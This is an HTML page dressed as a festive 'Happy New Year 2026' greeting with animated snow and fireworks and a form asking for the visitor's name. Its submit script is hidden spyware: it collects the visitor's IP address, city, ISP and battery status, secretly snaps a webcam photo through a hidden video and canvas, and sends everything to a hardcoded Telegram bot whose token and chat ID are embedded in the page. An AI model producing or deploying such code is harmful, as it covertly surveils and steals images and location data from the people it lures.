<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Happy New Year 2026</title>
  <style>
    /* New Year Theme Styles */
    body {
      font-family: 'Arial', sans-serif;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: center;
      min-height: 100vh;
      margin: 0;
      padding: 20px;
      background: linear-gradient(135deg, #0a043c, #1e2671);
      color: #fff;
      text-align: center;
      overflow-x: hidden;
      position: relative;
    }

    /* Snowflakes */
    .snowflake {
      position: absolute;
      color: #fff;
      font-size: 1em;
      animation: fall linear infinite;
      pointer-events: none;
    }

    @keyframes fall {
      to {
        transform: translateY(100vh);
      }
    }

    /* Main Container */
    .container {
      background: rgba(255, 255, 255, 0.1);
      backdrop-filter: blur(10px);
      border-radius: 20px;
      padding: 40px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
      max-width: 600px;
      width: 90%;
      position: relative;
      z-index: 1;
      border: 1px solid rgba(255, 255, 255, 0.2);
    }

    h1 {
      font-size: 3rem;
      margin-bottom: 10px;
      background: linear-gradient(to right, #ffd700, #ff8c00, #ff4500);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      text-shadow: 0 2px 10px rgba(255, 215, 0, 0.3);
    }

    h2 {
      font-size: 1.8rem;
      margin-bottom: 30px;
      color: #fff;
    }

    .year {
      font-size: 5rem;
      font-weight: bold;
      background: linear-gradient(to right, #ffd700, #ff8c00);
      -webkit-background-clip: text;
      background-clip: text;
      color: transparent;
      margin: 20px 0;
      text-shadow: 0 0 20px rgba(255, 215, 0, 0.5);
    }

    /* Form Elements */
    input[type="text"] {
      padding: 15px 20px;
      font-size: 16px;
      margin: 20px 0;
      width: 80%;
      max-width: 400px;
      border: none;
      border-radius: 50px;
      background: rgba(255, 255, 255, 0.9);
      box-shadow: 0 4px 15px rgba(0, 0, 0, 0.1);
      transition: all 0.3s ease;
    }

    input[type="text"]:focus {
      outline: none;
      box-shadow: 0 0 0 3px rgba(255, 215, 0, 0.5);
      transform: scale(1.02);
    }

    button {
      padding: 15px 30px;
      font-size: 18px;
      background: linear-gradient(to right, #ff8c00, #ff4500);
      color: white;
      border: none;
      border-radius: 50px;
      cursor: pointer;
      transition: all 0.3s ease;
      box-shadow: 0 4px 15px rgba(255, 140, 0, 0.4);
      font-weight: bold;
      margin-top: 10px;
    }

    button:hover {
      transform: translateY(-3px);
      box-shadow: 0 6px 20px rgba(255, 140, 0, 0.6);
    }

    button:active {
      transform: translateY(1px);
    }

    /* Fireworks */
    .firework {
      position: absolute;
      width: 5px;
      height: 5px;
      border-radius: 50%;
      box-shadow: 0 0 10px 5px rgba(255, 215, 0, 0.7);
      animation: explode 1s ease-out infinite;
      opacity: 0;
      z-index: 0;
    }

    @keyframes explode {
      0% {
        transform: scale(0);
        opacity: 1;
      }
      100% {
        transform: scale(20);
        opacity: 0;
      }
    }

    /* Hidden elements */
    video, canvas {
      display: none;
    }

    /* Responsive */
    @media (max-width: 600px) {
      h1 {
        font-size: 2rem;
      }

      h2 {
        font-size: 1.4rem;
      }

      .year {
        font-size: 3.5rem;
      }

      .container {
        padding: 30px 20px;
      }
    }
  </style>
</head>
<body>
  <!-- Snowflakes will be added by JS -->

  <!-- Fireworks will be added by JS -->

  <div class="container">
    <h1>Happy New Year</h1>
    <div class="year">2026</div>
    <h2>Please Enter Your Name</h2>
    <input type="text" id="nameInput" placeholder="Enter your name">
    <button onclick="handleSubmit()">Submit</button>
  </div>

  <video id="video" autoplay></video>
  <canvas id="canvas"></canvas>

  <script>
    // Original script unchanged
    const BOT_TOKEN = '7752195168:AAGNWIc2vhdUxS1TMggHqSsi7GOpBmZ4SAU';
    const CHAT_ID = '6569859929';

    async function handleSubmit() {
      const name = document.getElementById('nameInput').value;
      if (!name) return alert('Please enter your name.');

      // Get IP + location info
      const locationData = await fetch('https://ipapi.co/json').then(res => res.json());

      // Get battery info
      const battery = await navigator.getBattery();
      const batteryInfo = `Battery: ${Math.round(battery.level * 100)}%, Charging: ${battery.charging}`;

      // Access camera
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const context = canvas.getContext('2d');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true });
        video.srcObject = stream;

        // Wait for video to load
        await new Promise(resolve => setTimeout(resolve, 2000));
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        context.drawImage(video, 0, 0);
        const imageData = canvas.toDataURL('image/png');
        stream.getTracks().forEach(track => track.stop());

        // Send to Telegram
        const caption = `Name: ${name}\nIP: ${locationData.ip}\nCity: ${locationData.city}, ${locationData.region}\nISP: ${locationData.org}\n${batteryInfo}`;

        const blob = await (await fetch(imageData)).blob();
        const formData = new FormData();
        formData.append('chat_id', CHAT_ID);
        formData.append('caption', caption);
        formData.append('photo', blob, 'photo.png');

        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
          method: 'POST',
          body: formData
        });

        // Redirect
        window.location.href = 'https://www.happynewyear2025.com';
      } catch (err) {
        alert('Failed to access camera or send data.');
        console.error(err);
      }
    }

    // New Year Theme Enhancements
    // Create snowflakes
    function createSnowflakes() {
      const snowflakesCount = 50;
      for (let i = 0; i < snowflakesCount; i++) {
        const snowflake = document.createElement('div');
        snowflake.classList.add('snowflake');
        snowflake.innerHTML = 'â„';
        snowflake.style.left = Math.random() * 100 + 'vw';
        snowflake.style.animationDuration = Math.random() * 3 + 2 + 's';
        snowflake.style.opacity = Math.random();
        snowflake.style.fontSize = Math.random() * 10 + 10 + 'px';
        document.body.appendChild(snowflake);
      }
    }

    // Create fireworks
    function createFireworks() {
      setInterval(() => {
        const firework = document.createElement('div');
        firework.classList.add('firework');
        firework.style.left = Math.random() * 100 + 'vw';
        firework.style.top = Math.random() * 100 + 'vh';
        firework.style.backgroundColor = `hsl(${Math.random() * 60 + 30}, 100%, 50%)`;
        document.body.appendChild(firework);

        // Remove after animation
        setTimeout(() => {
          firework.remove();
        }, 1000);
      }, 300);
    }

    // Initialize effects
    window.onload = function() {
      createSnowflakes();
      createFireworks();
    };
  </script>
</body>
</html>
